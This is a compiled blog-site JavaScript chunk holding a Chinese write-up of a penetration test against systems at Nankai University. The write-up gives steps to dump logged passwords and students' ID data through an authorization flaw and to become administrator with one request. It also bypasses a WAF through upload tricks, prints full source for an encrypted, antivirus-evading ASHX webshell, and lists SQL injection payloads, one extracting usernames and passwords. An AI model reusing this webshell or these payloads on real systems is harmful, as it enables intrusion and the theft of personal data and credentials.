"use strict";(self.webpackChunkdemo_blog=self.webpackChunkdemo_blog||[]).push([[74],{4995:(n,s,a)=>{a.r(s),a.d(s,{data:()=>t});const t={key:"v-4c30a974",path:"/edu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%8D%97%E5%BC%80%E5%A4%A7%E5%AD%A6%E6%9F%90%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html",title:"南开大学某系统的渗透测试",lang:"zh-CN",frontmatter:{date:"2022/08/20 17:00",coverUrl:"https://img-blog.csdnimg.cn/d38b1545fdc34ab9b04b85ad25d47dea.png",stick:!1,keyword:"渗透测试,EDU,web安全",description:"南开大学某系统的渗透测试",title:"南开大学某系统的渗透测试",tag:["EDU"],categories:["Edu渗透测试"]},excerpt:"",headers:[{level:2,title:"漏洞1：",slug:"漏洞1",children:[]},{level:2,title:"漏洞2",slug:"漏洞2",children:[]},{level:2,title:"漏洞点3：SQL注入两处Bypass",slug:"漏洞点3-sql注入两处bypass",children:[]}],git:{updatedTime:1662200606e3,contributors:[{name:"misdazzling",email:"359405846@qq.com",commits:1}]}}},877:(n,s,a)=>{a.r(s),a.d(s,{default:()=>I});var t=a(6252);const p=(0,t._)("h1",{id:"漏洞点1-越权",tabindex:"-1"},[(0,t._)("a",{class:"header-anchor",href:"#漏洞点1-越权","aria-hidden":"true"},"#"),(0,t.Uk)(" 漏洞点1：越权")],-1),e=(0,t._)("p",null,[(0,t.Uk)("url:https://xxxx.xxxxx.edu.cn"),(0,t._)("br"),(0,t.Uk)(" 某开大学证书站 (同系统不同站 思路一样) 通过superadmin账号登录获取日志接口信息 password替换成 ecfe6335568d9aa8fxxxxxxxd92bca "),(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/d38b1545fdc34ab9b04b85ad25d47dea.png",data:"aurora"})],-1),o=(0,t._)("p",null,[(0,t.Uk)("日志接口获取所有登录过的账号和密码 post /sys/log/loadLogLoginAndOutList rows=10&page=2&order=asc&remote_ip=&username=&startTime=&endTime= "),(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/3db9c50420e94e96aa797252ebd1d1fb.png",data:"aurora"})],-1),c=(0,t._)("p",null,"拿获取的学生账号登录",-1),l=(0,t._)("blockquote",null,[(0,t._)("p",null,"15xxxxxx 3a45 3xxxxxxxxxxxx1eef6d9")],-1),u=(0,t._)("p",null,"接口获取学生个人信息，身份证+姓名+学号",-1),i=(0,t._)("blockquote",null,[(0,t._)("p",null,"/gradms/base/infoStutrainInfo/loadInfoStutrainInfoList?state=1")],-1),r=(0,t._)("p",null,"GET改为POST传输",-1),k=(0,t._)("blockquote",null,[(0,t._)("p",null,"rows=10&page=1&order=asc&orgCode=&majorUniqueId=&grade=&perNum=&perName=")],-1),g=(0,t._)("p",null,"page是页数",-1),d=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/9d3750f871364dfdba69f65b612a59f9.png",data:"aurora"})],-1),b=(0,t.uE)('<div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code>POST /auth/switchPosition\n<span class="token assign-left variable">positionId</span><span class="token operator">=</span><span class="token number">1</span>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>直接成为管理员</p><h1 id="漏洞点2-文件上传getshell" tabindex="-1"><a class="header-anchor" href="#漏洞点2-文件上传getshell" aria-hidden="true">#</a> 漏洞点2：文件上传GetShell</h1><h2 id="漏洞1" tabindex="-1"><a class="header-anchor" href="#漏洞1" aria-hidden="true">#</a> 漏洞1：</h2><p>网站存在一处上传 WAF是安全狗的 头像处 先上传一个11.jpg的文件，然后抓包的时候改成11.html.ashx 然后记住</p><blockquote><p>104DCCCA002D5F067BFD970D2CF37410</p></blockquote>',6),m=(0,t._)("p",null,[(0,t.Uk)("这样就绕过检测 直接上传11.ashx会waf拦截 "),(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/427eca1dd4384cc5b66c197fe27dde74.png",data:"aurora"})],-1),h=(0,t._)("p",null,"然后继续吧得到的Ticket替换之前成11.html.ashx的 然后插入免杀一句话，11.jpg改成11.html.ashx并且替换ticket改成",-1),f=(0,t._)("blockquote",null,[(0,t._)("p",null,"104DCCCA002D5F067BFD970D2CF37410")],-1),y=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/051c5e142e684df78bd5fb9fba9fdd00.png",data:"aurora"})],-1),x=(0,t.uE)('<p>WAF检测文件名和内容 这里用到两个脚本一个是ashx免杀马 一个是生成文件的马，都能绕过安全狗检测 ashx马：</p><div class="language-bash ext-sh line-numbers-mode"><pre class="language-bash"><code><span class="token operator">&lt;</span>%@ <span class="token assign-left variable">Language</span><span class="token operator">=</span><span class="token string">&quot;C#&quot;</span> <span class="token assign-left variable">Class</span><span class="token operator">=</span><span class="token string">&quot;Handler1&quot;</span> %<span class="token operator">&gt;</span>\npublic class Handler1 <span class="token builtin class-name">:</span> System.Web.IHttpHandler,System.Web.SessionState.IRequiresSessionState\n<span class="token punctuation">{</span>\npublic void ProcessRequest<span class="token punctuation">(</span>System.Web.HttpContext Context<span class="token punctuation">)</span> <span class="token punctuation">{</span> try<span class="token punctuation">{</span>string key <span class="token operator">=</span> <span class="token string">&quot;202cb962ac59075b&quot;</span><span class="token punctuation">;</span>string pass <span class="token operator">=</span> <span class="token string">&quot;123&quot;</span><span class="token punctuation">;</span>string md5 <span class="token operator">=</span> System.BitConverter.ToString<span class="token punctuation">(</span>new System.Security.Cryptography.MD5CryptoServiceProvider<span class="token punctuation">(</span><span class="token punctuation">)</span>.ComputeHash<span class="token punctuation">(</span>System.Text.Encoding.Default.GetBytes<span class="token punctuation">(</span>pass + key<span class="token punctuation">))</span><span class="token punctuation">)</span>.Replace<span class="token punctuation">(</span><span class="token string">&quot;-&quot;</span>, <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> System.Convert.FromBase64String<span class="token punctuation">(</span>Context.Request<span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>data <span class="token operator">=</span> new System.Security.Cryptography.RijndaelManaged<span class="token punctuation">(</span><span class="token punctuation">)</span>.CreateDecryptor<span class="token punctuation">(</span>System.Text.Encoding.Default.GetBytes<span class="token punctuation">(</span>key<span class="token punctuation">)</span>, System.Text.Encoding.Default.GetBytes<span class="token punctuation">(</span>key<span class="token punctuation">))</span>.TransformFinalBlock<span class="token punctuation">(</span>data, <span class="token number">0</span>, data.Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Context.Session<span class="token punctuation">[</span><span class="token string">&quot;payload&quot;</span><span class="token punctuation">]</span> <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span> Context.Session<span class="token punctuation">[</span><span class="token string">&quot;payload&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>System.Reflection.Assembly<span class="token punctuation">)</span>typeof<span class="token punctuation">(</span>System.Reflection.Assembly<span class="token punctuation">)</span>.GetMethod<span class="token punctuation">(</span><span class="token string">&quot;Load&quot;</span>, new System.Type<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> typeof<span class="token punctuation">(</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>.Invoke<span class="token punctuation">(</span>null, new object<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span><span class="token punctuation">}</span>else<span class="token punctuation">{</span> object o <span class="token operator">=</span> <span class="token variable"><span class="token punctuation">((</span>System.Reflection.Assembly<span class="token punctuation">)</span>Context.Session[&quot;payload&quot;]<span class="token punctuation">)</span>.CreateInstance<span class="token punctuation">(</span>&quot;LY&quot;<span class="token punctuation">)</span><span class="token punctuation">;</span> o.Equals<span class="token punctuation">(</span>Context<span class="token punctuation">)</span><span class="token punctuation">;</span> o.Equals<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> byte[] r <span class="token operator">=</span> System.Convert.FromBase64String<span class="token punctuation">(</span>o.ToString<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> Context.Response.Write<span class="token punctuation">(</span>md5.Substring<span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">16</span><span class="token punctuation">))</span><span class="token punctuation">;</span> Context.Response.Write<span class="token punctuation">(</span>System.Convert.ToBase64String<span class="token punctuation">(</span>new System.Security.Cryptography.RijndaelManaged<span class="token punctuation">(</span><span class="token punctuation">)</span>.CreateEncryptor<span class="token punctuation">(</span>System.Text.Encoding.Default.GetBytes<span class="token punctuation">(</span>key<span class="token punctuation">)</span>, System.Text.Encoding.Default.GetBytes<span class="token punctuation">(</span>key<span class="token punctuation">))</span>.TransformFinalBlock<span class="token punctuation">(</span>r, <span class="token number">0</span>, r.Length<span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Context.Response.Write<span class="token punctuation">(</span>md5.Substring<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>catch<span class="token punctuation">(</span>System.Exception<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token punctuation">}</span> public bool IsReusable <span class="token punctuation">{</span> get <span class="token punctuation">{</span> <span class="token builtin class-name">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>\nashx生成马:\n<span class="token operator">&lt;</span>%@ WebHandler <span class="token assign-left variable">Language</span><span class="token operator">=</span><span class="token string">&quot;C#&quot;</span> <span class="token assign-left variable">Class</span><span class="token operator">=</span><span class="token string">&quot;Handler&quot;</span> %<span class="token operator">&gt;</span>\nusing System<span class="token punctuation">;</span>\nusing System.Web<span class="token punctuation">;</span>\nusing System.IO<span class="token punctuation">;</span>\npublic class Handler <span class="token builtin class-name">:</span> IHttpHandler <span class="token punctuation">{</span>\npublic void ProcessRequest <span class="token punctuation">(</span>HttpContext context<span class="token punctuation">)</span> <span class="token punctuation">{</span> context.Response.ContentType <span class="token operator">=</span> <span class="token string">&quot;text/plain&quot;</span><span class="token punctuation">;</span> //偬<span class="token punctuation">(</span>頤\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>目录遍历（全局都是遍历） 可以看到解析了并且内容也出来了</p>',3),S=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/94c7f0bdbf1241739376ae015e0ed008.png",data:"aurora"})],-1),_=(0,t._)("h2",{id:"漏洞2",tabindex:"-1"},[(0,t._)("a",{class:"header-anchor",href:"#漏洞2","aria-hidden":"true"},"#"),(0,t.Uk)(" 漏洞2")],-1),q=(0,t._)("p",null,[(0,t.Uk)("账号注册随意 一般都有头像上传或者申请要上传证件照什么的 "),(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/94720eea5a2a472e9824545db93d8a27.png",data:"aurora"}),(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/94446189c2c24e53a9a228768fa0879a.png",data:"aurora"})],-1),C=(0,t._)("p",null,"如果上传php-waf的话拦截",-1),v=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/8ec9be3f48eb4f8c996873b00736bc36.png",data:"aurora"}),(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/2ec72f4f57e24da48551371c56a238d7.png",data:"aurora"})],-1),E=(0,t._)("blockquote",null,[(0,t._)("p",null,'Content-Disposition: form-data; name="file"; filename="1.html Content-Disposition: filename="."')],-1),z=(0,t._)("p",null,"双写Content-Disposition拼接绕过 判断第一个filename获取不到闭合换下行组合白名单闭合绕过",-1),B=(0,t._)("h2",{id:"漏洞点3-sql注入两处bypass",tabindex:"-1"},[(0,t._)("a",{class:"header-anchor",href:"#漏洞点3-sql注入两处bypass","aria-hidden":"true"},"#"),(0,t.Uk)(" 漏洞点3：SQL注入两处Bypass")],-1),D=(0,t._)("p",null,"注入点",-1),T=(0,t._)("blockquote",null,[(0,t._)("p",null,"/apps/MyVideo/TeacherSchool/MyStudent.aspx")],-1),F=(0,t._)("p",null,"注入绕过",-1),j=(0,t._)("blockquote",null,[(0,t._)("p",null,"11'+//AND+//(//SELECT//+2868+//FROM//+(//SELECT//(SLEEP(2)))pcFy)+//AND//+'")],-1),w=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/0dee56a7da9f48028788768b9a83eeee.png",data:"aurora"})],-1),A=(0,t._)("blockquote",null,[(0,t._)("p",null,"https://xxxx.nankai.edu.cn/http/77726476706e69737468656265737421f2e30f92263e635177468ca88d1b203b/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(),concat((select%20(select%20(select%20concat(username,0x27,password)%20from%20cdb_members%20limit%201)%20)%20from%20information_schema.tables%20limit%200,1),floor(rand(0)2))x%20from%20information_schema.tables%20group%20by%20x)a)%23")],-1),R=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"在这里插入图片描述",originSrc:"https://img-blog.csdnimg.cn/6572ece8bc0c4a36ae4e00eb99a1debb.png",data:"aurora"})],-1),L=(0,t._)("p",null,"成功注入出数据",-1),H={},I=(0,a(3744).Z)(H,[["render",function(n,s){return(0,t.wg)(),(0,t.iD)(t.HY,null,[p,e,o,c,l,u,i,r,k,g,d,b,m,h,f,y,x,S,_,q,C,v,E,z,B,D,T,F,j,w,A,R,L],64)}]])}}]);